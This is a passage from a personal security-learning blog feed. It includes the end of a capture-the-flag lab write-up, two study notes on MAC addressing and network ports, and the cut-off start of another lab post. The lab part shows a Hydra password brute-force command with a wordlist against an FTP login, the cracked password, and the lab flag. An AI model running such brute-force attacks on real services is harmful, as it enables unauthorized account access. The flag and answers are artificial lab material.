</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">150</span> Opening BINARY mode data connection <span style="color:#cba6f7">for</span> PUBLIC_NOTICE.txt <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">353</span> bytes<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">226</span> Transfer complete.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">353</span> bytes received in 0.00 secs <span style="color:#89dceb;font-weight:bold">(</span>226.4958 kB/s<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>ftp&gt; bye
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">221</span> Goodbye.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>root@ip-10-10-87-146:~# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>burp.json   Desktop    Instructions  Postman            Rooms    thinclient_drives
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>CTFBuilder  Downloads  Pictures      PUBLIC_NOTICE.txt  Scripts  Tools
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>root@ip-10-10-87-146:~# cat PUBLIC_NOTICE.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">===================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>MESSAGE FROM SYSTEM <span style="color:#f5e0dc">ADMINISTRATORS</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">===================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Hello,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>I hope everyone is aware that the
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>FTP server will not be available
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>over the weekend- we will be
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>carrying out routine system
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>maintenance. Backups will be
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>made to my account so I reccomend
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>encrypting any sensitive data.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>Cheers,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>Mike</span></span></code></pre></div>
<h4 id="exploiting-ftp">Exploiting FTP</h4>
<div style="text-align: center"><img src="./image24.png"></div>
<br>
<p>What is the password for user &ldquo;mike&rdquo;?</p>






<pre tabindex="0"><code>password</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:~# hydra -t <span style="color:#fab387">4</span> -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.41.45 ftp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Hydra v8.6 <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">2017</span> by van Hauser/THC - Please <span style="color:#cba6f7">do</span> not use in military or secret service organizations, or <span style="color:#cba6f7">for</span> illegal purposes.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Hydra <span style="color:#89dceb;font-weight:bold">(</span>http://www.thc.org/thc-hydra<span style="color:#89dceb;font-weight:bold">)</span> starting at 2024-06-25 04:40:47
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> Restorefile <span style="color:#89dceb;font-weight:bold">(</span>you have <span style="color:#fab387">10</span> seconds to abort... <span style="color:#89dceb;font-weight:bold">(</span>use option -I to skip waiting<span style="color:#89dceb;font-weight:bold">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> max <span style="color:#fab387">4</span> tasks per <span style="color:#fab387">1</span> server, overall <span style="color:#fab387">4</span> tasks, <span style="color:#fab387">14344398</span> login tries <span style="color:#89dceb;font-weight:bold">(</span>l:1/p:14344398<span style="color:#89dceb;font-weight:bold">)</span>, ~3586100 tries per task
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> attacking ftp://10.10.41.45:21/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> Resolving addresses ... <span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> resolving <span style="color:#cba6f7">done</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;123456&#34;</span> - <span style="color:#fab387">1</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;12345&#34;</span> - <span style="color:#fab387">2</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 1<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;123456789&#34;</span> - <span style="color:#fab387">3</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 2<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.41.45 - login <span style="color:#a6e3a1">&#34;mike&#34;</span> - pass <span style="color:#a6e3a1">&#34;password&#34;</span> - <span style="color:#fab387">4</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 3<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>21<span style="color:#89dceb;font-weight:bold">][</span>ftp<span style="color:#89dceb;font-weight:bold">]</span> host: 10.10.41.45   login: mike   password: password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">[</span>STATUS<span style="color:#89dceb;font-weight:bold">]</span> attack finished <span style="color:#cba6f7">for</span> 10.10.41.45 <span style="color:#89dceb;font-weight:bold">(</span>waiting <span style="color:#cba6f7">for</span> children to <span style="color:#89dceb">complete</span> tests<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> target successfully completed, <span style="color:#fab387">1</span> valid password found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Hydra <span style="color:#89dceb;font-weight:bold">(</span>http://www.thc.org/thc-hydra<span style="color:#89dceb;font-weight:bold">)</span> finished at 2024-06-25 04:41:03</span></span></code></pre></div>
<br>
<p>What is ftp.txt?</p>






<pre tabindex="0"><code>THM{y0u_g0t_th3_ftp_fl4g}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:~# ftp 10.10.41.45
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Connected to 10.10.41.45.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">220</span> Welcome to the administrator FTP service.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Name <span style="color:#89dceb;font-weight:bold">(</span>10.10.41.45:root<span style="color:#89dceb;font-weight:bold">)</span>: mike
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">331</span> Please specify the password.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">230</span> Login successful.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Remote system <span style="color:#89dceb">type</span> is UNIX.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>ftp&gt; ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#fab387">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>drwxrwxrwx    <span style="color:#fab387">2</span> <span style="color:#fab387">0</span>        <span style="color:#fab387">0</span>            <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">24</span>  <span style="color:#fab387">2020</span> ftp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>-rwxrwxrwx    <span style="color:#fab387">1</span> <span style="color:#fab387">0</span>        <span style="color:#fab387">0</span>              <span style="color:#fab387">26</span> Apr <span style="color:#fab387">24</span>  <span style="color:#fab387">2020</span> ftp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">226</span> Directory send OK.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>ftp&gt; get ftp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>local: ftp.txt remote: ftp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#fab387">150</span> Opening BINARY mode data connection <span style="color:#cba6f7">for</span> ftp.txt <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">26</span> bytes<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#fab387">226</span> Transfer complete.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#fab387">26</span> bytes received in 0.00 secs <span style="color:#89dceb;font-weight:bold">(</span>29.6273 kB/s<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>ftp&gt; bye
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#fab387">221</span> Goodbye.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root@ip-10-10-87-146:~# cat ftp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>y0u_g0t_th3_ftp_fl4g<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Life of a Packet</title>
      <link>http://localhost:1313/til-life-of-a-packet/</link>
      <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-life-of-a-packet/</guid>
      <description>Today, while studying for my CCNA with Jeremy&amp;rsquo;s IT Lab YouTube videos, I learned something very useful that I can&amp;rsquo;t help but write about because I want to remember it for a long time and make the knowledge mine.
The image below is the network topology used in the Lab.
PC1 pings PC4.
Identify the source/destination MAC address at each specified point in the route to PC4. Identify the MAC address by the device and interface (ie.</description>
      <content:encoded><![CDATA[<p>Today, while studying for my CCNA with Jeremy&rsquo;s IT Lab YouTube videos, I learned something very useful that I can&rsquo;t help but write about because I want to remember it for a long time and make the knowledge mine.</p>
<div style="text-align: center"><img src="./pepe-internet.gif"></div>
<hr>
<p>The image below is the network topology used in the Lab.</p>
<div style="text-align: center"><img src="./image15.png"></div>
<p>PC1 pings PC4.</p>
<p>Identify the source/destination MAC address at each specified point in the route to PC4.
Identify the MAC address by the device and interface (ie. the MAC of R1 G0/0)
</br></p>
<h5 id="q1-sourcedestination-mac-addresses-at-pc1--sw1-segment">Q1. Source/Destination MAC addresses at PC1 → SW1 segment</h5>






<pre tabindex="0"><code>Source MAC Address: 1111
Destination MAC Address: AAAA</code></pre>






<pre tabindex="0"><code>C:\&gt;ipconfig /all

FastEthernet0 Connection:(default port)

Connection-specific DNS Suffix..:
Physical Address................: 00D0.BA11.1111
Link-local IPv6 Address.........: FE80::2D0:BAFF:FEE1:6988
IPv6 Address....................: ::
IPv4 Address....................: 192.168.1.1
Subnet Mask.....................: 255.255.255.0
Default Gateway.................: ::
192.168.1.254
DHCP Servers....................: 0.0.0.0
DHCPv6 IAID.....................:
DHCPv6 Client DUID..............: 00-01-00-01-09-99-E5-2C-00-D0-BA-11-11-11
DNS Servers.....................: ::
0.0.0.0</code></pre>
<p>the last four digits of PC1&rsquo;s MAC Address is <code>1111</code> . We are sending a packet from PC1 to PC4, which means the source IP Address is <code>192.168.1.1</code> (PC1&rsquo;s IP Address) and the destination IP Address is <code>192.168.3.1</code> (PC4&rsquo;s IP Address). The source and destination IP Address remain unchanged throughout the communication. Because PC4 is located on a different network, PC1 will encapsulate the packet with an Ethernet header and the destination MAC address will be the MAC address of its <code>default gateway</code>. In this case, it&rsquo;s R1&rsquo;s g0/0 interface. It will be the destination MAC address.</p>






<pre tabindex="0"><code>R1&gt;enable
R1#show interfaces g0/0
GigabitEthernet0/0 is up, line protocol is up (connected)
Hardware is CN Gigabit Ethernet, address is 0000.01aa.aaaa (bia 00d0.ff77.0101)</code></pre>
<p>The last four digits of R1&rsquo;s g0/0 interface MAC address is <code>aaaa</code> .</p>
<div style="text-align: center"><img src="./image16.png"></div>
<br/>
<h5 id="q2-sourcedestination-mac-addresses-at-sw1--r1-segment">Q2. Source/Destination MAC addresses at SW1 → R1 segment.</h5>






<pre tabindex="0"><code>Source MAC Address: 1111
Destination MAC Address: AAAA</code></pre>
<p>The Source/Destination MAC addresses at SW1 to R1 segment should be the same as Q1. Switches do not change the source and destination MAC addresses in the frame. It will simply use the source MAC address field in the Ethernet header to learn PC1&rsquo;s MAC address if it doesn&rsquo;t already know it, and then forward the frame to the proper destination, or flood it if it hasn&rsquo;t learned the destination MAC address yet.</p>
<br/>
<h5 id="q3-sourcedestination-mac-addresses-at-r1--r2-segment">Q3. Source/Destination MAC addresses at R1 → R2 segment</h5>






<pre tabindex="0"><code>Source MAC address: BBBB
Destination MAC address: CCCC</code></pre>
<p>Like I already mentioned, the source and destination IP addresses will remain the same, as R1 encapsulates the packet with an Ethernet header, it will use the MAC address of its g0/1 interface as the source MAC address and the MAC address of R2&rsquo;s g0/0 interface, which is the next hop in the route, as the destination MAC address.</p>
<div style="text-align: center"><img src="./image17.png"></div>
<p>The last four digits of R1&rsquo;s g0/1 interface MAC address is <code>BBBB</code>.</p>
<div style="text-align: center"><img src="./image18.png"></div>
<p>The last four digits of R2&rsquo;s g0/0 interface MAC address is <code>CCCC</code>.</p>
<div style="text-align: center"><img src="./image19.png"></div>
<p>Here, on Cisco Packet Tracer, we can confirm the source/destination MAC address on the Ethernet header in Layer 2.</p>
<br/>
<h5 id="q4-sourcedestination-mac-addresses-at-r2--r3-segment">Q4. Source/Destination MAC addresses at R2 → R3 segment.</h5>






<pre tabindex="0"><code>Source MAC address: DDDD
Destination MAC address: EEEE</code></pre>
<p>The source MAC address will be R2&rsquo;s interface g0/1 and the destination MAC address will be R3&rsquo;s interface g0/0.</p>
<div style="text-align: center"><img src="./image20.png"></div>
<p>The last four digits of R2&rsquo;s interface g0/1 MAC address is <code>DDDD</code>.</p>
<div style="text-align: center"><img src="./image21.png"></div>
<p>The last four digits of R3&rsquo;s interface g0/0 MAC address is <code>EEEE</code>.</p>
<div style="text-align: center"><img src="./image22.png"></div>
<br/>
<h5 id="q5-e-sourcedestination-mac-addresses-at-r3--sw2-segment">Q5. E. Source/Destination MAC addresses at R3 → SW2 segment.</h5>






<pre tabindex="0"><code>Source MAC address: FFFF
Destination MAC address: 4444</code></pre>
<p>At this point, the destination IP address is part of a network connected to R3, <code>192.168.3.0/24</code> , so R3 knows it can send the packet directly to PC4. So, it will set the destination MAC address to PC4&rsquo;s MAC address, and use its own address as the source.</p>
<p>The source MAC address will be R3&rsquo;s g0/1 interface, which is <code>FFFF</code> .</p>
<div style="text-align: center"><img src="./image23.png"></div>
<p>The destination MAC address will be PC4&rsquo;s MAC address, which turned out to be <code>4444</code> (the last 4 digits).</p>






<pre tabindex="0"><code>Cisco Packet Tracer PC Command Line 1.0
C:\&gt;ipconfig /all

FastEthernet0 Connection:(default port)

Connection-specific DNS Suffix..:
Physical Address................: 000C.8544.4444
Link-local IPv6 Address.........: FE80::20C:85FF:FEC4:BDB4
IPv6 Address....................: ::
IPv4 Address....................: 192.168.3.1
Subnet Mask.....................: 255.255.255.0
Default Gateway.................: ::
192.168.3.254
DHCP Servers....................: 0.0.0.0
DHCPv6 IAID.....................:
DHCPv6 Client DUID..............: 00-01-00-01-2D-AC-7E-D8-00-0C-85-44-44-44
DNS Servers.....................: ::
0.0.0.0</code></pre>
<br/>
<h5 id="q6-sourcedestination-mac-addresses-at-sw2--pc4-segment">Q6. Source/Destination MAC addresses at SW2 → PC4 segment.</h5>






<pre tabindex="0"><code>Source MAC address: FFFF
Destination MAC address: 4444</code></pre>
<p>The answer for Q6 is the same as Q5 because the SW2 only forwards the frame. The switch does not alter the source or destination MAC addresses in the Ethernet frame. The switch&rsquo;s role is to efficiently forward the frame to the correct destination based on its MAC address table. If it doesn&rsquo;t already know the destination MAC address, it will flood the frame.</p>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Port</title>
      <link>http://localhost:1313/til-port/</link>
      <pubDate>Fri, 21 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-port/</guid>
      <description>I feel like I&amp;rsquo;ve only scratched the surface when it comes to understanding Ports. Since I have an interview coming up, I want to review the basics of Ports, even if it&amp;rsquo;s very fundamental.
What is a port? From Wikipedia
a port is a number assigned to uniquely identify a connection endpoint and to direct data to a specific service.
To simply put, a port is like an address for a specific program or service running on a computer.</description>
      <content:encoded><![CDATA[<p>I feel like I&rsquo;ve only scratched the surface when it comes to understanding Ports. Since I have an interview coming up, I want to review the basics of Ports, even if it&rsquo;s very fundamental.</p>
<hr>
<h3 id="what-is-a-port">What is a port?</h3>
<p>From Wikipedia</p>
<blockquote>
<p>a port is a number assigned to uniquely identify a connection endpoint and to direct data to a specific service.</p>
</blockquote>
<p>To simply put, a port is like an address for a specific program or service running on a computer.</p>
<p>An IP address identifies a device on a network, while a port number identifies a specific process or service running on that device. When data is sent over a network, the IP address directs the data to the correct device, and the port number ensures it reaches the correct application or service on that device.</p>
<p>Because a computer runs multiple processes simultaneously, not just a single one, it is import to distinguish between them. For example, on my computer right now, I have multiple Google Chrome tabs open, Discord running, and I&rsquo;m listening to music on Spotify.</p>
<p>So, let&rsquo;s say we want to communicate with a program on an external server. Assuming we know its IP address, if we don&rsquo;t know its port number, we won&rsquo;t be able to locate the specific program we want to communicate with.</p>
<h3 id="why-do-we-not-specify-the-port-numbers-in-the-browser">Why do we not specify the port numbers in the browser?</h3>
<p>It is said that to communicate with a specific server, you need to know both the IP address and the port number. Through the domain address, you can only find out the IP address. So, how can we communicate normally without entering the port number?</p>
<p>When you enter a domain address in the address bar and press enter, the browser is set to send the communicate to port 80 by default. That&rsquo;s why you don&rsquo;t need to enter the port number. If you don&rsquo;t want to communicate through port 80, you can set the port number separately in the address bar.</p>
<h3 id="there-are-total-65535-ports">There are total 65,535 ports.</h3>
<ul>
<li>Port numbers 0 - 1023 are called <code>System or Well-known</code> ports.</li>
<li>Port numbers 1024 - 49151 are called <code>User</code> or <code>Registered</code> ports.</li>
<li>Port numbers 49152-65535 are called <code>Dynamic</code> or <code>Private</code> ports.</li>
</ul>
<hr>
<p>Now it all makes sense. When we are doing a CTF, the first thing we always do in the enumeration phase is utilize the <code>nmap</code> command to perform port scanning. This helps us identify open ports and see which services are running on them. The target might be running several programs, and we need to find and confirm which programs/services are running and identify corresponding vulnerabilities.</p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Redeemer</title>
      <link>http://localhost:1313/htb-redeemer/</link>
      <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-redeemer/</guid>
      <description>some thoughts:
This box was the most challenging one to crack so far, but I feel incredibly accomplished seeing my progress. I really enjoy writing about my experiences in this personal space, even though no one else is seeing it. I&amp;rsquo;m practicing not to rely on external sources unless I&amp;rsquo;ve tried everything I can on my own, and I&amp;rsquo;m really glad I&amp;rsquo;ve decided to do so. Working on this box has made me feel like I&amp;rsquo;m going to remember every step I took to get the flag.</description>
      <content:encoded><![CDATA[<p>some thoughts:</p>
